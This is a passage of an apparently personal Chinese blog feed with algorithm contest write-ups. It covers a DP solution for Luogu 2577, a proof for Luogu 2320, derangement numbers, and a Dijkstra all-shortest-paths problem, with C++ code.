class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FWD(x, b, e) for (int x = b; x &lt; e; x++)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BWD(x, b, e) for (int x = b; x &gt;= e; x--)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">MAX</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x &lt; y ? y : x; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">MIN</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x &lt; y ? x : y; &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a, b;<span class="comment">// a is pick time, b is eat time</span></span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> Node &amp;y) <span class="keyword">const</span> &#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;b &gt; y.b; &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Node man[<span class="number">300</span>];</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">80010</span>];</span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">300</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;man[i].a, &amp;man[i].b);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(man, man + n);</span><br><span class="line"></span><br><span class="line">    sum[<span class="number">0</span>] = man[<span class="number">0</span>].a;</span><br><span class="line">    FWD(i, <span class="number">1</span>, n) &#123; sum[i] = sum[i - <span class="number">1</span>] + man[i].a; &#125;</span><br><span class="line">    <span class="built_in">memset</span>(dp, <span class="number">10</span>, <span class="keyword">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>] = man[<span class="number">0</span>].b + man[<span class="number">0</span>].a;</span><br><span class="line">    dp[man[<span class="number">0</span>].a] = man[<span class="number">0</span>].b + man[<span class="number">0</span>].a;</span><br><span class="line">    FWD(i, <span class="number">1</span>, n) &#123;</span><br><span class="line">        BWD(j, sum[i], <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp1 = INF, tmp2 = INF;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= man[i].a) &#123;</span><br><span class="line">                tmp1 = MAX(dp[j - man[i].a], j + man[i].b);<span class="comment">// 第一个人放在1队</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum[i] - j &gt;= man[i].a) &#123;</span><br><span class="line">                tmp2 = MAX(dp[j], sum[i] - j + man[i].b);<span class="comment">// 第i个人放在二队</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果j只能允许man[i].a放在一队，则i就放一队</span></span><br><span class="line">            <span class="keyword">if</span> (j &gt;= man[i].a &amp;&amp; sum[i] - j &lt; man[i].a) &#123;</span><br><span class="line">                dp[j] = tmp1;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (j &lt; man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123;</span><br><span class="line">                dp[j] = tmp2;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (j &gt;= man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123;</span><br><span class="line">                dp[j] = MIN(tmp2, tmp1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans = INF;</span><br><span class="line">    FWD(i, <span class="number">0</span>, sum[n - <span class="number">1</span>] + <span class="number">1</span>) &#123; ans = ans &lt; dp[i] ? ans : dp[i]; &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>注意，在枚举$dp[i][j]$ 的<code>j</code> 时，要注意该<code>j</code> 是否允许<code>man[i].a</code> 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN</p></li><li><p>注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j&lt;man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j&lt;man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。</p></li><li><p>此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归</p><img src="/2018/05/20/洛谷2577-午餐/1.png"></li><li><p><a href="https://www.luogu.org/problemnew/solution/P2577" target="_blank" rel="noopener">截图来源 </a></p></li></ul>]]></content>
    
    <summary type="html">
    
      题解
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="ACM" scheme="https://h-zex.github.io/tags/ACM/"/>
    
      <category term="动态规划" scheme="https://h-zex.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>洛谷2320 鬼谷子的钱袋 形式化证明</title>
    <link href="https://h-zex.github.io/2018/05/17/%E6%B4%9B%E8%B0%B72320-%E9%AC%BC%E8%B0%B7%E5%AD%90%E7%9A%84%E9%92%B1%E8%A2%8B-%E5%BD%A2%E5%BC%8F%E5%8C%96%E8%AF%81%E6%98%8E/"/>
    <id>https://h-zex.github.io/2018/05/17/洛谷2320-鬼谷子的钱袋-形式化证明/</id>
    <published>2018-05-16T17:33:21.000Z</published>
    <updated>2019-07-02T15:43:52.141Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>鬼谷子非常聪明，正因为这样，他非常繁忙，经常有各诸侯车的特派员前来向他咨询时政。</p><p>有一天，他在咸阳游历的时候，朋友告诉他在咸阳最大的拍卖行（聚宝商行）将要举行一场拍卖会，其中有一件宝物引起了他极大的兴趣，那就是无字天书。</p><p>但是，他的行程安排得很满，他已经买好了去邯郸的长途马车票，不巧的是出发时间是在拍卖会快要结束的时候。于是，他决定事先做好准备，将自己的金币数好并用一个个的小钱袋装好，以便在他现有金币的支付能力下，任何数目的金币他都能用这些封闭好的小钱的组合来付账。</p><p>鬼谷子也是一个非常节俭的人，他想方设法使自己在满足上述要求的前提下，所用的钱袋数最少，并且不有两个钱袋装有相同的大于1的金币数。假设他有m个金币，你能猜到他会用多少个钱袋，并且每个钱袋装多少个金币吗？</p><h4 id="输入输出格式"><a href="#输入输出格式" class="headerlink" title="输入输出格式"></a>输入输出格式</h4><ul><li><p>输入格式：包含一个整数，表示鬼谷子现有的总的金币数目m。其中，1≤m ≤1000000000。</p></li><li><p>输出格式：两行，第一行一个整数h，表示所用钱袋个数。第二行表示每个钱袋所装的金币个数，由小到大输出，空格隔开</p></li></ul><h4 id="输入输出示例"><a href="#输入输出示例" class="headerlink" title="输入输出示例"></a>输入输出示例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">输出</span><br><span class="line">2</span><br><span class="line">1 2</span><br></pre></td></tr></table></figure><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><ul><li>对于m个待装袋的金币，取$\lceil m/2\rceil$ 个金币装入第一个袋子，然后递归求解</li></ul><h2 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h2><ul><li>对于一个数m，采用每次分割一半的方法，共分割出$\lfloor lg_2m\rfloor+1$ 个袋子</li><li>按照题意，我们需要给出一个k个元素的序列，这个序列有$2^k$ 种选择元素的方法。每种选择法得出一个值。而因为需要能构造出所有可能的值，也就是要构造出$[0,m]$ 内的所有值，共m+1个值，所以$k\geq \lceil lg_2(m+1)\rceil$ </li><li>对于$m\geq1$，$\lceil lg_2(m+1)\rceil= \lfloor lg_2m\rfloor+1$</li><li>所以我们的解法已经达到了最优</li></ul>]]></content>
    
    <summary type="html">
    
      题解
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="ACM" scheme="https://h-zex.github.io/tags/ACM/"/>
    
      <category term="数学" scheme="https://h-zex.github.io/tags/%E6%95%B0%E5%AD%A6/"/>
    
      <category term="递归" scheme="https://h-zex.github.io/tags/%E9%80%92%E5%BD%92/"/>
    
  </entry>
  
  <entry>
    <title>组合数之错排数</title>
    <link href="https://h-zex.github.io/2018/05/14/%E7%BB%84%E5%90%88%E6%95%B0%E4%B9%8B%E9%94%99%E6%8E%92%E6%95%B0/"/>
    <id>https://h-zex.github.io/2018/05/14/组合数之错排数/</id>
    <published>2018-05-14T13:51:56.000Z</published>
    <updated>2019-07-02T15:43:51.317Z</updated>
    
    <content type="html"><![CDATA[<h2 id="错排数的定义"><a href="#错排数的定义" class="headerlink" title="错排数的定义"></a>错排数的定义</h2><ul><li>假设有n个元素，n个位置，每个元素都有自己唯一的正确位置，问，所有元素都处在错误位置有多少可能</li></ul><h2 id="递推公式"><a href="#递推公式" class="headerlink" title="递推公式"></a>递推公式</h2><ul><li>设$f(n)$ 表示n个元素的错排种数，则$f(n+1)=n*(f(n)+f(n-1))$ </li><li>解释如下<ul><li>假设已经有n个元素错排，新来一个元素，那么该元素处于已有的n个元素的位置都可以实现错排，所以有$n*f(n)$ 种可能</li><li>假设已有n个元素，其中n-1个是错排的，另外一个是正确的，这种情况有n种。新来一个元素，这个元素唯有跟那个正确元素交换位置才可以实现n+1个元素的错排。所以有$n*f(n-2)$ 种可能</li></ul></li><li>为什么没有其他可能？<ul><li>因为对于n+1个元素的某个错排来说，假设第$n+1$个元素处于第i位($i\neq n+1$)，然后第$n+1$个位置有第k个元素，那么要么$k=i$ 或者$k\neq i$ ，没有其他可能情况</li></ul></li></ul><h2 id="ACM题"><a href="#ACM题" class="headerlink" title="ACM题"></a>ACM题</h2><ul><li>hdu2049</li></ul>]]></content>
    
    <summary type="html">
    
      n个元素都不在自己的位置上，有多少种可能
    
    </summary>
    
      <category term="数学" scheme="https://h-zex.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    
      <category term="ACM" scheme="https://h-zex.github.io/tags/ACM/"/>
    
      <category term="组合数" scheme="https://h-zex.github.io/tags/%E7%BB%84%E5%90%88%E6%95%B0/"/>
    
      <category term="错排" scheme="https://h-zex.github.io/tags/%E9%94%99%E6%8E%92/"/>
    
  </entry>
  
  <entry>
    <title>天梯L3 007 天梯地图</title>
    <link href="https://h-zex.github.io/2018/05/13/%E5%A4%A9%E6%A2%AFL3-007-%E5%A4%A9%E6%A2%AF%E5%9C%B0%E5%9B%BE/"/>
    <id>https://h-zex.github.io/2018/05/13/天梯L3-007-天梯地图/</id>
    <published>2018-05-13T07:10:04.000Z</published>
    <updated>2019-07-02T15:43:51.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/2018/05/13/天梯L3-007-天梯地图/1.png"><h4 id="输入示例一"><a href="#输入示例一" class="headerlink" title="输入示例一"></a>输入示例一</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">10 15</span><br><span class="line">0 1 0 1 1</span><br><span class="line">8 0 0 1 1</span><br><span class="line">4 8 1 1 1</span><br><span class="line">5 4 0 2 3</span><br><span class="line">5 9 1 1 4</span><br><span class="line">0 6 0 1 1</span><br><span class="line">7 3 1 1 2</span><br><span class="line">8 3 1 1 2</span><br><span class="line">2 5 0 2 2</span><br><span class="line">2 1 1 1 1</span><br><span class="line">1 5 0 1 3</span><br><span class="line">1 4 0 1 1</span><br><span class="line">9 7 1 1 3</span><br><span class="line">3 1 0 2 5</span><br><span class="line">6 3 1 2 1</span><br><span class="line">5 3</span><br></pre></td></tr></table></figure><h4 id="输出示例一"><a href="#输出示例一" class="headerlink" title="输出示例一"></a>输出示例一</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Time = 6: 5 =&gt; 4 =&gt; 8 =&gt; 3</span><br><span class="line">Distance = 3: 5 =&gt; 1 =&gt; 3</span><br></pre></td></tr></table></figure><h4 id="输入示例二"><a href="#输入示例二" class="headerlink" title="输入示例二"></a>输入示例二</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">7 9</span><br><span class="line">0 4 1 1 1</span><br><span class="line">1 6 1 3 1</span><br><span class="line">2 6 1 1 1</span><br><span class="line">2 5 1 2 2</span><br><span class="line">3 0 0 1 1</span><br><span class="line">3 1 1 3 1</span><br><span class="line">3 2 1 2 1</span><br><span class="line">4 5 0 2 2</span><br><span class="line">6 5 1 2 1</span><br><span class="line">3 5</span><br></pre></td></tr></table></figure><h4 id="输出示例二"><a href="#输出示例二" class="headerlink" title="输出示例二"></a>输出示例二</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Time = 3; Distance = 4: 3 =&gt; 2 =&gt; 5</span><br></pre></td></tr></table></figure><h2 id="Dijstra算法"><a href="#Dijstra算法" class="headerlink" title="Dijstra算法"></a>Dijstra算法</h2><ul><li>bfs+优先队列其实就是dijstra算法</li><li>dijstra维护result set，源节点到这个set里的点的最短路径已经找到，所以result set只会有node被加进去而不会有node被踢出去</li><li>不同于算法导论描述的dijstra算法——算导里的堆是点的堆，所以当发现有新的路径可以以更小的代价到达某点时（该点之前已经在堆里），会使用堆decrease key操作——把这个点的权值减低，并且调整堆使得堆合法。但是stl的优先队列并没有decrease key的操作，所以使用另一种实现——允许某点多次加入到优先队列里——其实就等价于优先队列里放Edge。所以在从优先队列里pop出最小权的点时，要判断该点是否已经处于result set里。这样做会使得复杂度从$O((E+V)lgV)$ 变为$O(ElgE)$ </li></ul><h2 id="Dijstra找出所有最短路径"><a href="#Dijstra找出所有最短路径" class="headerlink" title="Dijstra找出所有最短路径"></a>Dijstra找出所有最短路径</h2><ul><li>从src到dest的路径上的某些节点有多种到达方法——这就导致了多条路径。所以我们要维护所有节点的parent list——无论从哪个parent 到这个节点都是最短的。</li><li>具体实现是：从优先队列其pop出某节点，该节点已经处于result set里，但是源节点到该节点的代价与result中的这个节点的路径代价相同，那么这条新的路径就是另一个条到达这个节点的路径。使用一个vector来存储某个节点的parent list——比如<code>vector&lt;int&gt; parent[600]</code> ，则<code>parent[n]</code> 代表的vector就是编号为n的节点的parent list</li><li>然后使用dfs去计算所有可能的路径的另外一种代价——比如此题，以时间为权重的最短路径有多条，但是我们还需要计算出这些路径在使用路径长度作为权重时该路径的代价。这一步可以使用记忆化搜索。</li></ul><h2 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h2><h4 id="不可以这样寻找同代价的不同parent-节点"><a href="#不可以这样寻找同代价的不同parent-节点" class="headerlink" title="不可以这样寻找同代价的不同parent 节点"></a>不可以这样寻找同代价的不同parent 节点</h4><ul><li><p>代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数me是该edge的终点，p是该edge的起点，t出发的源节点到这条edge的终点的代价</span></span><br><span class="line"><span class="comment">// 其实edge t就代表了节点me</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> me;</span><br><span class="line">    <span class="keyword">int</span> p;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    Edge_t(<span class="keyword">int</span> m, <span class="keyword">int</span> h, <span class="keyword">int</span> y) : me(m), p(h), t(y) &#123;&#125; </span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> Edge_t &amp;x) <span class="keyword">const</span> &#123; <span class="keyword">return</span> x.t &lt; <span class="keyword">this</span>-&gt;t; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!que.empty()) &#123;</span><br><span class="line">    Edge_t t = que.top();</span><br><span class="line">    que.pop();</span><br><span class="line">    <span class="keyword">while</span> (!que.empty() &amp;&amp; que.top().t == t.t &amp;&amp; que.top().me == t.me)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可能某<code>Edge h</code> 确实跟pop出来的<code>Edge t</code>是代表的是同一个节点——也就是<code>h.me==t.me</code> ，并且代价相同。但是在堆中，还有同等代价的<code>Edge p</code>，其终点不是<code>t.me</code> ——也就是<code>p.me!=t.me</code> ，然后该<code>Edge p</code> 在堆中的位置处在<code>Edge h</code> 前面，所以上面那个while就没办法获得<code>Edge h</code> 从而无法获取完整的parent list。</p></li><li><p>另一种情况更为严重——如果某边是0权重，那么就可能出现“把t.me加到result set之后，后面的循环才产生出另一条与src到t.me等代价的路径”——所以当pop出<code>Edge t</code> 后立刻寻找同等代价的路径是不行的，因为该边其实还没有进入到堆里</p></li></ul><h4 id="考虑自循环边"><a href="#考虑自循环边" class="headerlink" title="考虑自循环边"></a>考虑自循环边</h4><ul><li>直接判断要求某点A邻接的点不与A相同即可实现</li></ul><h4 id="因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意"><a href="#因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意" class="headerlink" title="因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意"></a>因为有0权重的边，所以可能有0权重环路，所以后面的dfs要注意</h4><ul><li>dfs递归访问某条路径时要维护已经访问到的节点的列表，确保不重复访问该条路径上已经出现过的点，做法是维护一个visit数组，有点类似回溯法</li></ul><h4 id="INF的取值要注意"><a href="#INF的取值要注意" class="headerlink" title="INF的取值要注意"></a>INF的取值要注意</h4><ul><li>dfs过程中有可能访问的那条路径无法从src到dest，从而递归到最深的那次dfs的调用会返回INF，如果INF是0xFFFFFFF，加上后面的权重，就会溢出，从而使得<code>INF+weight[i]</code>不再是INF</li></ul><h4 id="自己生成数据对拍时"><a href="#自己生成数据对拍时" class="headerlink" title="自己生成数据对拍时"></a>自己生成数据对拍时</h4><ul><li>要注意不要生成多重边，网上很多ac的代码都是不支持多重边的</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; adj;</span><br><span class="line">&#125;;</span><br><span class="line">Node v[<span class="number">600</span>];</span><br><span class="line"><span class="keyword">int</span> length[<span class="number">600</span>][<span class="number">600</span>]; <span class="comment">// length[i][j]记录从node i到node j的length</span></span><br><span class="line"><span class="keyword">int</span> TIME[<span class="number">600</span>][<span class="number">600</span>]; <span class="comment">// TIME[i][j]记录从node i到node j的用时</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tp[<span class="number">600</span>];<span class="comment">// node's parent list</span></span><br><span class="line"><span class="keyword">int</span> tpResult[<span class="number">600</span>];<span class="comment">// 最终的node的parent</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> BEGIN, END; <span class="comment">// 题目输入的天梯队员的起点和要到达的终点</span></span><br><span 